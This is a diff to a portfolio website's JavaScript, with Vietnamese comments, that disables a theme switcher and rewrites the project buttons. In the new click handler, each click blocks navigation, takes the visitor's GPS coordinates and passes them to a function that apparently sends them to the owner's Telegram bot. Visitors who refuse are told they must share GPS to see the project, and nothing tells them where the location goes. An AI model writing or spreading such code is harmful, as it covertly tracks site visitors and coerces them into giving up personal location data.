@@ -1,11 +1,12 @@
 // 1. Theme Logic (Chế độ Sáng/Tối)
 document.addEventListener("DOMContentLoaded", function () {
   // 1. Khai báo danh sách các file CSS giao diện
+  /*
   const themes = [
-    "css/cute.css",
-    "css/styles.css",
-    "css/style-wibu.css",
-    "css/pixel.css",
+    // "css/cute.css",
+    "css/styles.css"
+    // "css/style-wibu.css",
+    // "css/pixel.css",
   ];
 
   // 2. Lấy các phần tử cần thiết
@@ -48,6 +49,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
     applyTheme(currentThemeIndex);
   });
+  */
 
   const menuIcon = document.getElementById("menu-icon");
   const navbar = document.querySelector(".navbar");
@@ -148,17 +150,25 @@ function sendLocationToTelegram(lat, lng) {
 }
 
 document.querySelectorAll('.project-btn').forEach(btn => {
-  btn.addEventListener('click', function () {
-    // Chạy khi có thông tin Token và Chat ID
+  btn.addEventListener('click', function (e) {
+    e.preventDefault(); // Ngăn mở link ngay lập tức
+    const targetUrl = this.getAttribute('href');
+    const targetWindow = this.getAttribute('target') || '_self';
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
           sendLocationToTelegram(position.coords.latitude, position.coords.longitude);
+          // Mở link sau khi đã cấp quyền vị trí
+          window.open(targetUrl, targetWindow);
         },
         (error) => {
+          alert("Bạn phải chia sẻ GPS mới có thể xem được dự án!");
           console.log("Khách từ chối cấp quyền GPS hoặc lỗi.");
         }
       );
+    } else {
+      alert("Trình duyệt của bạn không hỗ trợ định vị GPS!");
     }
   });
 });
